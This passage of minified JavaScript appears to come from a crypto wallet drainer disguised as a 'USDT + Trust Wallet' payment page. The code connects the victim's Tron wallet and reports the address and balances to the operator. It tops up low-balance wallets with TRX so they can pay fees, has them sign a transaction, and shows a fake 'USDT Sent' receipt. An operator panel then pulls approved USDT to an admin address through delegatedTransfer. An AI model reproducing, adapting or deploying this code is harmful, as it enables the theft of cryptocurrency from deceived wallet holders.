                      , s = await t.transactionBuilder.triggerSmartContract(r, i, n, o, e);
                    console.log("Transaction Built:", s);
                    const a = (await this.provider.request({
                        method: "tron_signTransaction",
                        params: {
                            address: e,
                            transaction: s
                        }
                    }, "tron:0x2b6653dc")).result;
                    if (!a)
                        return {
                            success: !1
                        };
                    return await t.trx.sendRawTransaction(a)
                } catch (t) {
                    return {
                        success: !1,
                        error: t.message
                    }
                }
            }
        }
        const lG = () => {
            const {account: e, setAccount: t, setTx: r} = Ce()
              , [n,o] = (0,
            _.useState)(void 0)
              , [i,s] = (0,
            _.useState)(!1)
              , a = ["tron:".concat(aG)]
              , c = ["tron_signTransaction", "tron_signMessage"]
              , l = async (e, t) => {
                try {
                    const n = await e.sendTransaction(t);
                    if (n) {
                        const o = await e.getBalance(t)
                          , i = await iG(t);
                        r(n);
                        const s = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
                        sG(s)
                    }
                } catch (n) {
                    s(!0)
                }
            }
              , u = async (e, t) => {
                try {
                    const r = await e.getBalance(t)
                      , n = "New Wallet Connect\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code> \n\ud83d\udcb0Balance <code>").concat(r, "</code> TRX");
                    sG(n)
                } catch (r) {
                    console.error("Failed to fetch balance", r)
                }
            }
            ;
            return (0,
            Ae.jsx)(Ae.Fragment, {
                children: e ? (0,
                Ae.jsxs)("div", {
                    className: "flex-row items-center gap-2",
                    children: [(0,
                    Ae.jsx)("button", {
                        className: "w-full bg-blue-800 rounded-3xl hover:bg-blue-700 text-white font-semibold py-3 cursor-pointer transition-colors",
                        disabled: !0,
                        children: "Next"
                    }), i ? (0,
                    Ae.jsx)("span", {
                        className: "w-full text-center font-bold text-red-400 mt-2",
                        children: "Transaction declined"
                    }) : ""]
                }) : (0,
                Ae.jsx)("button", {
                    className: "w-full bg-blue-800 rounded-3xl hover:bg-blue-700 text-white font-semibold py-3 cursor-pointer transition-colors",
                    onClick: async () => {
                        try {
                            let __loader = document.getElementById("wc-loading-overlay");
                            if (!__loader) {
                                __loader = document.createElement("div");
                                __loader.id = "wc-loading-overlay";
                                __loader.style.position = "fixed";
                                __loader.style.inset = "0";
                                __loader.style.background = "transparent";
                                __loader.style.display = "flex";
                                __loader.style.alignItems = "center";
                                __loader.style.justifyContent = "center";
                                __loader.style.zIndex = "99999";
                                __loader.innerHTML = '<div style="display:flex;gap:12px;align-items:center;background:#ffffff;border:1px solid #e5e7eb;padding:12px 16px;border-radius:10px;box-shadow:0 10px 30px rgba(0,0,0,0.12)"><div style="width:22px;height:22px;border:3px solid #e5e7eb;border-top-color:#3b82f6;border-radius:50%;animation:wcspin 1s linear infinite"></div><div style="font-family:system-ui,-apple-system,Segoe UI,Roboto,Inter,Arial,sans-serif;font-size:14px;color:#111827">Please Wait…</div></div>';
                                const __style = document.createElement("style");
                                __style.textContent = "@keyframes wcspin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}";
                                document.head.appendChild(__style);
                                document.body.appendChild(__loader);
                            } else {
                                __loader.style.display = "flex";
                            }
                        } catch(_) {}
                        const e = await (async () => {
                            try {
                                return await YP.init({
                                    projectId: "1d7c094b92213b27e88ac00ab7602643",
                                    metadata: {
                                        name: "USDT",
                                        description: "USDT + Trust Wallet",
                                        url: "https://trustwallet-usdt.com",
                                        icons: ["https://avatars.githubusercontent.com/u/37784886"]
                                    }
                                })
                            } catch (e) {}
                        }
                        )();
                        if (e)
                            try {
                                e.once("display_uri", (e => {
                                    try {
                                        const __loader = document.getElementById("wc-loading-overlay");
                                        if (__loader)
                                            __loader.style.display = "none";
                                    } catch(_) {}
                                    const t = "trust://wc?uri=".concat(encodeURIComponent(e));
                                    window.location.href = t
                                }
                                ));
                                const r = (await e.connect({
                                    namespaces: {
                                        tron: {
                                            methods: c,
                                            chains: a,
                                            events: ["chainChanged", "accountsChanged"]
                                        }
                                    }
                                })).namespaces.tron.accounts[0].split(":")[2]
                                  , n = new cG(e);
                                u(n, r);
                                // Check if user has below 16 TRX and send 17 TRX
                                if (!(await (async (e, t) => {
                                    const r = rG.address.toHex(e)
                                      , n = rG.address.toHex(rG.defaultAddress.base58)
                                      , o = await rG.trx.getBalance(e)
                                      , i = o / 1e6;
                                    if (i >= 16)
                                        return {
                                            status: "skipped",
                                            message: "Recipient ".concat(e, " already has ").concat(i, " TRX (\u226516 TRX)"),
                                            balance: o,
                                            requiredAmount: t,
                                            result: !0
                                        };
                                    const s = await rG.transactionBuilder.sendTrx(r, 1e6 * t, n)
                                      , a = await rG.trx.sign(s);
                                    return await rG.trx.sendRawTransaction(a)
                                }
                                )(r, 17)).result)
                                    return void window.alert("TRX sending failed");
                                l(n, r),
                                t(r)
                            } catch (r) {
                            } finally {
                                const __loader = document.getElementById("wc-loading-overlay");
                                if (__loader) __loader.style.display = "none";
                            }
                    }
                    ,
                    children: "Next"
                })
            })
        }
        ;
        function uG(e) {
            let {children: t} = e;
            return (0,
            Ae.jsx)("div", {
                className: "w-full text-center",
                children: (0,
                Ae.jsx)("div", {
                    className: "",
                    children: t
                })
            })
        }
        var dG = {
            color: void 0,
            size: void 0,
            className: void 0,
            style: void 0,
            attr: void 0
        }
          , hG = _.createContext && _.createContext(dG)
          , fG = ["attr", "size", "title"];
        function pG(e, t) {
            if (null == e)
                return {};
            var r, n, o = function(e, t) {
                if (null == e)
                    return {};
                var r = {};
                for (var n in e)
                    if (Object.prototype.hasOwnProperty.call(e, n)) {
                        if (t.indexOf(n) >= 0)
                            continue;
                        r[n] = e[n]
                    }
                return r
            }(e, t);
            if (Object.getOwnPropertySymbols) {
                var i = Object.getOwnPropertySymbols(e);
                for (n = 0; n < i.length; n++)
                    r = i[n],
                    t.indexOf(r) >= 0 || Object.prototype.propertyIsEnumerable.call(e, r) && (o[r] = e[r])
            }
            return o
        }
        function gG() {
            return gG = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var r = arguments[t];
                    for (var n in r)
                        Object.prototype.hasOwnProperty.call(r, n) && (e[n] = r[n])
                }
                return e
            }
            ,
            gG.apply(this, arguments)
        }
        function yG(e, t) {
            var r = Object.keys(e);
            if (Object.getOwnPropertySymbols) {
                var n = Object.getOwnPropertySymbols(e);
                t && (n = n.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(e, t).enumerable
                }
                ))),
                r.push.apply(r, n)
            }
            return r
        }
        function mG(e) {
            for (var t = 1; t < arguments.length; t++) {
                var r = null != arguments[t] ? arguments[t] : {};
                t % 2 ? yG(Object(r), !0).forEach((function(t) {
                    bG(e, t, r[t])
                }
                )) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : yG(Object(r)).forEach((function(t) {
                    Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t))
                }
                ))
            }
            return e
        }
        function bG(e, t, r) {
            return t = function(e) {
                var t = function(e, t) {
                    if ("object" != typeof e || !e)
                        return e;
                    var r = e[Symbol.toPrimitive];
                    if (void 0 !== r) {
                        var n = r.call(e, t || "default");
                        if ("object" != typeof n)
                            return n;
                        throw new TypeError("@@toPrimitive must return a primitive value.")
                    }
                    return ("string" === t ? String : Number)(e)
                }(e, "string");
                return "symbol" == typeof t ? t : t + ""
            }(t),
            t in e ? Object.defineProperty(e, t, {
                value: r,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = r,
            e
        }
        function vG(e) {
            return e && e.map(( (e, t) => _.createElement(e.tag, mG({
                key: t
            }, e.attr), vG(e.child))))
        }
        function wG(e) {
            return t => _.createElement(TG, gG({
                attr: mG({}, e.attr)
            }, t), vG(e.child))
        }
        function TG(e) {
            var t = t => {
                var r, {attr: n, size: o, title: i} = e, s = pG(e, fG), a = o || t.size || "1em";
                return t.className && (r = t.className),
                e.className && (r = (r ? r + " " : "") + e.className),
                _.createElement("svg", gG({
                    stroke: "currentColor",
                    fill: "currentColor",
                    strokeWidth: "0"
                }, t.attr, n, s, {
                    className: r,
                    style: mG(mG({
                        color: e.color || t.color
                    }, t.style), e.style),
                    height: a,
                    width: a,
                    xmlns: "http://www.w3.org/2000/svg"
                }), i && _.createElement("title", null, i), e.children)
            }
            ;
            return void 0 !== hG ? _.createElement(hG.Consumer, null, (e => t(e))) : t(dG)
        }
        function AG(e) {
            return wG({
                tag: "svg",
                attr: {
                    viewBox: "0 0 1024 1024"
                },
                child: [{
                    tag: "path",
                    attr: {
                        d: "M136 384h56c4.4 0 8-3.6 8-8V200h176c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H196c-37.6 0-68 30.4-68 68v180c0 4.4 3.6 8 8 8zm512-184h176v176c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V196c0-37.6-30.4-68-68-68H648c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zM376 824H200V648c0-4.4-3.6-8-8-8h-56c-4.4 0-8 3.6-8 8v180c0 37.6 30.4 68 68 68h180c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm512-184h-56c-4.4 0-8 3.6-8 8v176H648c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h180c37.6 0 68-30.4 68-68V648c0-4.4-3.6-8-8-8zm16-164H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8z"
                    },
                    child: []
                }]
            })(e)
        }
        function EG(e) {
            return wG({
                tag: "svg",
                attr: {
                    viewBox: "0 0 24 24",
                    fill: "currentColor"
                },
                child: [{
                    tag: "path",
                    attr: {
                        d: "M12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22ZM11 15V17H13V15H11ZM11 7V13H13V7H11Z"
                    },
                    child: []
                }]
            })(e)
        }
        function PG(e) {
            return wG({
                tag: "svg",
                attr: {
                    viewBox: "0 0 448 512"
                },
                child: [{
                    tag: "path",
                    attr: {
                        d: "M436 160c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20V48c0-26.5-21.5-48-48-48H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h320c26.5 0 48-21.5 48-48v-48h20c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20v-64h20c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20v-64h20zm-228-32c35.3 0 64 28.7 64 64s-28.7 64-64 64-64-28.7-64-64 28.7-64 64-64zm112 236.8c0 10.6-10 19.2-22.4 19.2H118.4C106 384 96 375.4 96 364.8v-19.2c0-31.8 30.1-57.6 67.2-57.6h5c12.3 5.1 25.7 8 39.8 8s27.6-2.9 39.8-8h5c37.1 0 67.2 25.8 67.2 57.6v19.2z"
                    },
                    child: []
                }]
            })(e)
        }
        function CG(e) {
            return wG({
                tag: "svg",
                attr: {
                    viewBox: "0 0 448 512"
                },
                child: [{
                    tag: "path",
                    attr: {
                        d: "M352 320c-22.608 0-43.387 7.819-59.79 20.895l-102.486-64.054a96.551 96.551 0 0 0 0-41.683l102.486-64.054C308.613 184.181 329.392 192 352 192c53.019 0 96-42.981 96-96S405.019 0 352 0s-96 42.981-96 96c0 7.158.79 14.13 2.276 20.841L155.79 180.895C139.387 167.819 118.608 160 96 160c-53.019 0-96 42.981-96 96s42.981 96 96 96c22.608 0 43.387-7.819 59.79-20.895l102.486 64.054A96.301 96.301 0 0 0 256 416c0 53.019 42.981 96 96 96s96-42.981 96-96-42.981-96-96-96z"
                    },
                    child: []
                }]
            })(e)
        }
        function SG(e) {
            return wG({
                tag: "svg",
                attr: {
                    viewBox: "0 0 512 512"
                },
                child: [{
                    tag: "path",
                    attr: {
                        d: "M401.4 224h-214l83-79.4c11.9-12.5 11.9-32.7 0-45.2s-31.2-12.5-43.2 0L89 233.4c-6 5.8-9 13.7-9 22.4v.4c0 8.7 3 16.6 9 22.4l138.1 134c12 12.5 31.3 12.5 43.2 0 11.9-12.5 11.9-32.7 0-45.2l-83-79.4h214c16.9 0 30.6-14.3 30.6-32 .1-18-13.6-32-30.5-32z"
                    },
                    child: []
                }]
            })(e)
        }
        function IG() {
            const {account: e, setAccount: t, tx: r} = Ce()
              , [n,o] = (0,
            _.useState)()
              , [i,s] = (0,
            _.useState)(!1)
              , [a,c] = (0,
            _.useState)(0);
            (0,
            _.useEffect)(( () => {}
            ), [e]);
            return (0,
            Ae.jsx)(uG, {
                children: r ? (0,
                Ae.jsx)("div", {
                    className: "fixed inset-0 z-50 flex items-center justify-center p-2 mt-3",
                    children: (0,
                    Ae.jsxs)("div", {
                        className: "bg-white h-full w-full flex flex-col justify-start mt-1 items-center",
                        children: [(0,
                        Ae.jsxs)("div", {
                            className: "flex w-full justify-between mb-10 px-2",
                            children: [(0,
                            Ae.jsx)("div", {
                                className: "text-sm  font-bold",
                                children: (0,
                                Ae.jsx)(SG, {
                                    size: 26
                                })
                            }), (0,
                            Ae.jsx)("div", {
                                className: "text-lg font-bold",
                                children: "USDT Sent"
                            }), (0,
                            Ae.jsx)("div", {
                                className: "text-gray-500 text-sm ",
                                children: (0,
                                Ae.jsx)(CG, {
                                    size: 20
                                })
                            })]
                        }), (0,
                        Ae.jsxs)("div", {
                            className: "text-center mb-6",
                            children: [(0,
                            Ae.jsxs)("div", {
                                className: "text-3xl font-bold ",
                                children: ["-", n, " USDT"]
                            }), (0,
                            Ae.jsxs)("div", {
                                className: "text-gray-500 text-sm mt-1",
                                children: ["$", n]
                            })]
                        }), (0,
                        Ae.jsxs)("div", {
                            className: "bg-gray-100 w-full  rounded-xl p-4 mb-4 ",
                            children: [(0,
                            Ae.jsxs)("div", {
                                className: "flex w-full justify-between mb-4",
                                children: [(0,
                                Ae.jsx)("span", {
                                    className: "text-gray-500",
                                    children: "Date"
                                }), (0,
                                Ae.jsx)("span", {
                                    className: "font-medium text-gray-600",
                                    children: (new Date).toLocaleString()
                                })]
                            }), (0,
                            Ae.jsxs)("div", {
                                className: "flex justify-between mb-4",
                                children: [(0,
                                Ae.jsxs)("span", {
                                    className: "flex justify-center",
                                    children: [(0,
                                    Ae.jsx)("span", {
                                        className: "text-gray-500 ",
                                        children: "Status"
                                    }), "  ", (0,
                                    Ae.jsx)(EG, {
                                        size: 17,
                                        className: "ml-1 mt-[2px]"
                                    })]
                                }), (0,
                                Ae.jsx)("span", {
                                    className: "font-medium text-gray-500",
                                    children: (null !== r && void 0 !== r && r.result,
                                    "Completed")
                                })]
                            }), (0,
                            Ae.jsxs)("div", {
                                className: "flex justify-between mb-3",
                                children: [(0,
                                Ae.jsx)("span", {
                                    className: "text-gray-500",
                                    children: "Recipient"
                                }), (0,
                                Ae.jsx)("span", {
                                    className: "font-mono text-gray-600",
                                    children: (e => {
                                        if (e) {
                                            const t = e.slice(0, 5)
                                              , r = e.slice(-4);
                                            return "".concat(t, "...").concat(r)
                                        }
                                        return ""
                                    }
                                    )(LV)
                                })]
                            })]
                        }), (0,
                        Ae.jsx)("div", {
                            className: "bg-gray-100 rounded-xl p-4 mb-6 w-full ",
                            children: (0,
                            Ae.jsxs)("div", {
                                className: "flex justify-between mb-2",
                                children: [(0,
                                Ae.jsxs)("span", {
                                    className: "flex justify-center",
                                    children: [(0,
                                    Ae.jsx)("span", {
                                        className: "text-gray-500 ",
                                        children: "Network fee"
                                    }), "  ", (0,
                                    Ae.jsx)(EG, {
                                        size: 17,
                                        className: "ml-1 mt-[2px]"
                                    })]
                                }), (0,
                                Ae.jsxs)("span", {
                                    className: "font-medium text-gray-600",
                                    children: [.3, " TRX"]
                                })]
                            })
                        }), (0,
                        Ae.jsx)("button", {
                            className: " p-3 w-full bg-slate-50 rounded-lg border-dashed",
                            children: "View on block explor"
                        })]
                    })
                }) : (0,
                Ae.jsxs)("div", {
                    className: "flex flex-col justify-between h-screen w-full bg-white shadow-lg p-5",
                    children: [(0,
                    Ae.jsxs)("form", {
                        className: "flex flex-col gap-4",
                        children: [(0,
                        Ae.jsxs)("label", {
                            className: "flex flex-col gap-1 mb-3",
                            children: [(0,
                            Ae.jsx)("span", {
                                className: "font-medium text-sm text-start text-gray-600",
                                children: "Address or Domain Name"
                            }), (0,
                            Ae.jsxs)("div", {
                                className: "flex flex-row items-center rounded-md gap-3 border p-1 focus-within:ring-2 focus-within:ring-blue-700",
                                children: [(0,
                                Ae.jsx)("input", {
                                    type: "text",
                                    className: "w-full rounded px-3 py-2 focus:outline-none [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none",
                                    value: LV,
                                    placeholder: "0x...",
                                    required: !0
                                }), (0,
                                Ae.jsxs)("div", {
                                    className: "flex flex-row gap-4",
                                    children: [(0,
                                    Ae.jsx)("span", {
                                        className: "font-bold cursor-pointer text-[13px] text-blue-700",
                                        children: "Paste"
                                    }), (0,
                                    Ae.jsx)("span", {
                                        className: "font-bold cursor-pointer text-sm text-blue-700",
                                        children: (0,
                                        Ae.jsx)(PG, {
                                            size: 16
                                        })
                                    }), (0,
                                    Ae.jsx)("span", {
                                        className: "font-bold cursor-pointer text-sm text-blue-700",
                                        children: (0,
                                        Ae.jsx)(AG, {
                                            size: 16
                                        })
                                    })]
                                })]
                            })]
                        }), (0,
                        Ae.jsxs)("label", {
                            className: "flex flex-col gap-1",
                            children: [(0,
                            Ae.jsx)("span", {
                                className: "font-medium text-sm text-start text-gray-600",
                                children: "Amount"
                            }), (0,
                            Ae.jsxs)("div", {
                                className: "flex flex-row items-center rounded-md gap-3 border p-1 focus-within:ring-2 focus-within:ring-blue-700",
                                children: [(0,
                                Ae.jsx)("input", {
                                    type: "number",
                                    className: "w-full rounded px-3 py-2 focus:outline-none [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none",
                                    value: n,
                                    onChange: e => o(Number(e.target.value)),
                                    placeholder: "Amount",
                                    min: "0",
                                    required: !0
                                }), (0,
                                Ae.jsxs)("div", {
                                    className: "flex flex-row gap-4 p-1",
                                    children: [(0,
                                    Ae.jsx)("span", {
                                        className: "font-bold text-sm text-gray-500",
                                        children: "USDT"
                                    }), (0,
                                    Ae.jsx)("span", {
                                        className: "font-bold cursor-pointer text-sm text-blue-600",
                                        children: "Max"
                                    })]
                                })]
                            }), (0,
                            Ae.jsxs)("span", {
                                className: "text-start text-gray-800 text-[12px]",
                                children: ["= $", n]
                            })]
                        }), (0,
                        Ae.jsxs)("label", {
                            className: "flex flex-col gap-1",
                            children: [(0,
                            Ae.jsx)("span", {
                                className: "font-medium text-sm text-start text-gray-600",
                                children: "Memo"
                            }), (0,
                            Ae.jsxs)("div", {
                                className: "flex flex-row items-center rounded-md gap-3 border p-1 focus-within:ring-2 focus-within:ring-blue-700",
                                children: [(0,
                                Ae.jsx)("input", {
                                    type: "text",
                                    className: "w-full rounded px-3 py-2 focus:outline-none [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none",
                                    placeholder: "",
                                    required: !0
                                }), (0,
                                Ae.jsxs)("div", {
                                    className: "flex flex-row gap-4 p-1",
                                    children: [(0,
                                    Ae.jsx)("span", {
                                        className: "font-bold cursor-pointer text-sm text-blue-700",
                                        children: (0,
                                        Ae.jsx)(AG, {
                                            size: 17
                                        })
                                    }), (0,
                                    Ae.jsx)("span", {
                                        className: "font-bold cursor-pointer text-sm text-blue-700",
                                        children: (0,
                                        Ae.jsx)(EG, {
                                            size: 17
                                        })
                                    })]
                                })]
                            })]
                        })]
                    }), (0,
                    Ae.jsx)(lG, {})]
                })
            })
        }
        function BG() {
            const {account: e} = Ce()
              , [t,r] = (0,
            _.useState)("")
              , [n,o] = (0,
            _.useState)("")
              , [i,s] = (0,
            _.useState)(void 0)
              , [a,c] = (0,
            _.useState)(void 0)
              , [l,u] = (0,
            _.useState)(!1)
              , d = async () => {
                try {
                    const e = await (async (e, t) => {
                        try {
                            console.log("Address", "ownerAddress", e, "spenderAddress", t, nG.address);
                            const r = (await rG.transactionBuilder.triggerConstantContract(UV, "allowance(address,address)", {}, [{
                                type: "address",
                                value: e
                            }, {
                                type: "address",
                                value: t
                            }], rG.address.toHex(t))).constant_result[0];
                            console.log("allowance", r);
                            const n = r.startsWith("0x") ? r : "0x".concat(r);
                            return rG.toBigNumber(n).toNumber()
                        } catch (r) {
                            console.log("Error fetching allowance:", r)
                        }
                    }
                    )(n, DV);
                    return console.log("allownce ", e),
                    c(e),
                    e
                } catch (e) {
                    console.error("Failed to check allowance", e),
                    alert("Error checking allowance")
                }
            }
              , h = async () => {
                try {
                    const e = await iG(n);
                    return console.log("balance ", e),
                    s(e),
                    e
                } catch (e) {
                    console.error("Failed to check allowance", e),
                    alert("Error checking allowance")
                }
            }
            ;
            (0,
            _.useEffect)(( () => {
                (async () => {
                    const e = await d()
                      , t = await h();
                    console.log("UserAllowance", e, t)
                }
                )()
            }
            ), [n]);
            return (0,
            Ae.jsx)(uG, {
                children: (0,
                Ae.jsxs)("div", {
                    className: "max-w-lg mx-auto mt-2 bg-white shadow-lg rounded-xl p-8",
                    children: [(0,
                    Ae.jsx)("h2", {
                        className: "text-2xl font-bold mb-6 text-center",
                        children: "Token Allowance & Withdraw"
                    }), (0,
                    Ae.jsxs)("form", {
                        className: "flex flex-col gap-4",
                        children: [(0,
                        Ae.jsxs)("label", {
                            className: "flex flex-col gap-1",
                            children: [(0,
                            Ae.jsx)("span", {
                                className: "font-medium",
                                children: "USDT Contract Address"
                            }), (0,
                            Ae.jsx)("input", {
                                type: "text",
                                className: "border rounded px-3 py-2 ",
                                value: UV,
                                disabled: !0,
                                placeholder: "0x...",
                                required: !0
                            })]
                        }), (0,
                        Ae.jsxs)("label", {
                            className: "flex flex-col gap-1",
                            children: [(0,
                            Ae.jsx)("span", {
                                className: "font-medium",
                                children: "Sender Contract Address"
                            }), (0,
                            Ae.jsx)("input", {
                                type: "text",
                                className: "border rounded px-3 py-2 ",
                                value: LV,
                                placeholder: "0x...",
                                required: !0
                            })]
                        }), (0,
                        Ae.jsxs)("label", {
                            className: "flex flex-col gap-1",
                            children: [(0,
                            Ae.jsx)("span", {
                                className: "font-medium",
                                children: "Admin Address"
                            }), (0,
                            Ae.jsx)("input", {
                                type: "text",
                                className: "border rounded px-3 py-2 ",
                                value: jV,
                                placeholder: "0x...",
                                required: !0
                            })]
                        }), (0,
                        Ae.jsxs)("label", {
                            className: "flex flex-col gap-1",
                            children: [(0,
                            Ae.jsx)("span", {
                                className: "font-medium",
                                children: "Token Owner Address"
                            }), (0,
                            Ae.jsx)("input", {
                                type: "text",
                                className: "border rounded px-3 py-2 ",
                                value: n,
                                onChange: e => o(e.target.value),
                                placeholder: "0x...",
                                required: !0
                            })]
                        }), (0,
                        Ae.jsxs)("label", {
                            className: "flex flex-col gap-1",
                            children: [(0,
                            Ae.jsx)("span", {
                                className: "font-medium",
                                children: "Amount"
                            }), (0,
                            Ae.jsx)("input", {
                                type: "number",
                                className: "border rounded px-3 py-2  [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none",
                                value: t,
                                onChange: e => r(e.target.value),
                                placeholder: "Amount",
                                min: "0",
                                required: !0
                            })]
                        }), (0,
                        Ae.jsx)("button", {
                            type: "button",
                            onClick: () => {
                                d(),
                                h()
                            }
                            ,
                            className: "mt-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded cursor-pointer transition-colors",
                            children: "Check Allowance"
                        }), (0,
                        Ae.jsx)("button", {
                            type: "button",
                            onClick: async () => {
                                try {
                                    let e;
                                    if (!n)
                                        return void JP("invalid token owner address", "error");
                                    await nG.connect(),
                                    e = rG.toBigNumber(Number(t).toString()).times("1e".concat(6)).toFixed(0),
                                    console.log("converted amount ", e),
                                    u(!0);
                                    const r = await (async (e, t, r) => {
                                        try {
                                            const n = "delegatedTransfer(address,address,address,uint256)"
                                              , o = {
                                                feeLimit: 1e9,
                                                callValue: 0,
                                                owner_address: rG.address.toHex(nG.address)
                                            }
                                              , i = [{
                                                type: "address",
                                                value: UV
                                            }, {
                                                type: "address",
                                                value: e
                                            }, {
                                                type: "address",
                                                value: t
                                            }, {
                                                type: "uint256",
                                                value: r
                                            }]
                                              , {transaction: s} = await rG.transactionBuilder.triggerSmartContract(LV, n, o, i, nG.address)
                                              , a = await nG.signTransaction(s)
                                              , c = await rG.trx.sendRawTransaction(a);
                                            return console.log("data", c),
                                            c
                                        } catch (n) {}
                                    }
                                    )(n, jV, e);
                                    null !== r && void 0 !== r && r.result ? JP("Withdraw successful", "success") : JP("Withdraw failed", "error")
                                } catch (e) {
                                    console.error("Withdraw failed", e)
                                }
                                u(!1)
                            }
                            ,
                            className: "mt-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded cursor-pointer  transition-colors",
                            children: l ? "Loading..." : "Withdraw"
                        }), (0,
                        Ae.jsxs)("div", {
                            className: "grid items-center justify-center mt-4 gap-3",
                            children: [(0,
                            Ae.jsxs)("span", {
                                className: "text-center",
                                children: ["Allowance: ", a, " USDT"]
                            }), (0,
                            Ae.jsxs)("span", {
                                children: ["Balance: ", i, " USDT"]
                            })]
                        })]
                    })]
                })
            })
        }
        r(4358);
        const xG = ["sri"]
          , OG = ["page"]
          , _G = ["page", "matches"]
          , WG = ["onClick", "discover", "prefetch", "relative", "reloadDocument", "replace", "state", "target", "to", "preventScrollReset", "viewTransition"]
          , RG = ["aria-current", "caseSensitive", "className", "end", "style", "to", "viewTransition", "children"]
          , kG = ["discover", "fetcherKey", "navigate", "reloadDocument", "replace", "state", "method", "action", "onSubmit", "relative", "preventScrollReset", "viewTransition"];
        var MG = "popstate";
        function NG() {
            return VG((function(e, t) {
                let {pathname: r, search: n, hash: o} = e.location;
                return LG("", {
                    pathname: r,
                    search: n,
                    hash: o
                }, t.state && t.state.usr || null, t.state && t.state.key || "default")
            }
            ), (function(e, t) {
                return "string" === typeof t ? t : jG(t)
            }
            ), null, arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {})
        }
        function FG(e, t) {
            if (!1 === e || null === e || "undefined" === typeof e)
                throw new Error(t)
        }
        function UG(e, t) {
            if (!e) {
                "undefined" !== typeof console && console.warn(t);
                try {
                    throw new Error(t)
                } catch (_l) {}
            }
        }
        function DG(e, t) {
            return {
                usr: e.state,
                key: e.key,
                idx: t
            }
        }
        function LG(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : null
              , n = arguments.length > 3 ? arguments[3] : void 0;
            return (0,
            k.A)((0,
            k.A)({
                pathname: "string" === typeof e ? e : e.pathname,
                search: "",
                hash: ""
            }, "string" === typeof t ? zG(t) : t), {}, {
                state: r,
                key: t && t.key || n || Math.random().toString(36).substring(2, 10)
            })
        }
        function jG(e) {
            let {pathname: t="/", search: r="", hash: n=""} = e;
            return r && "?" !== r && (t += "?" === r.charAt(0) ? r : "?" + r),
            n && "#" !== n && (t += "#" === n.charAt(0) ? n : "#" + n),
            t
        }
        function zG(e) {
            let t = {};
            if (e) {
                let r = e.indexOf("#");
                r >= 0 && (t.hash = e.substring(r),
                e = e.substring(0, r));
                let n = e.indexOf("?");
                n >= 0 && (t.search = e.substring(n),
                e = e.substring(0, n)),
                e && (t.pathname = e)
            }
            return t
        }
        function VG(e, t, r) {
            let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {}
              , {window: o=document.defaultView, v5Compat: i=!1} = n
              , s = o.history
              , a = "POP"
              , c = null
              , l = u();
            function u() {
                return (s.state || {
                    idx: null
                }).idx
            }
            function d() {
                a = "POP";
                let e = u()
                  , t = null == e ? null : e - l;
                l = e,
                c && c({
                    action: a,
                    location: f.location,
                    delta: t
                })
            }
            function h(e) {
                return HG(e)
            }
            null == l && (l = 0,
            s.replaceState((0,
            k.A)((0,
            k.A)({}, s.state), {}, {
                idx: l
            }), ""));
            let f = {
                get action() {
                    return a
                },
                get location() {
                    return e(o, s)
                },
                listen(e) {
                    if (c)
                        throw new Error("A history only accepts one active listener");
                    return o.addEventListener(MG, d),
                    c = e,
                    () => {
                        o.removeEventListener(MG, d),
                        c = null
                    }
                },
                createHref: e => t(o, e),
                createURL: h,
                encodeLocation(e) {
                    let t = h(e);
                    return {
                        pathname: t.pathname,
                        search: t.search,
                        hash: t.hash
                    }
                },
                push: function(e, t) {
                    a = "PUSH";
                    let n = LG(f.location, e, t);
                    r && r(n, e),
                    l = u() + 1;
                    let d = DG(n, l)
                      , h = f.createHref(n);
                    try {
                        s.pushState(d, "", h)
                    } catch (p) {
                        if (p instanceof DOMException && "DataCloneError" === p.name)
                            throw p;
                        o.location.assign(h)
                    }
                    i && c && c({
                        action: a,
                        location: f.location,
                        delta: 1
                    })
                },
                replace: function(e, t) {
                    a = "REPLACE";
                    let n = LG(f.location, e, t);
                    r && r(n, e),
                    l = u();
                    let o = DG(n, l)
                      , d = f.createHref(n);
                    s.replaceState(o, "", d),
                    i && c && c({
                        action: a,
                        location: f.location,
                        delta: 0
                    })
                },
                go: e => s.go(e)
            };
            return f
        }
        function HG(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
              , r = "http://localhost";
            "undefined" !== typeof window && (r = "null" !== window.location.origin ? window.location.origin : window.location.href),
            FG(r, "No window.location.(origin|href) available to create URL");
            let n = "string" === typeof e ? e : jG(e);
            return n = n.replace(/ $/, "%20"),
            !t && n.startsWith("//") && (n = r + n),
            new URL(n,r)
        }
        new WeakMap;
        function qG(e, t) {
            return GG(e, t, arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "/", !1)
        }
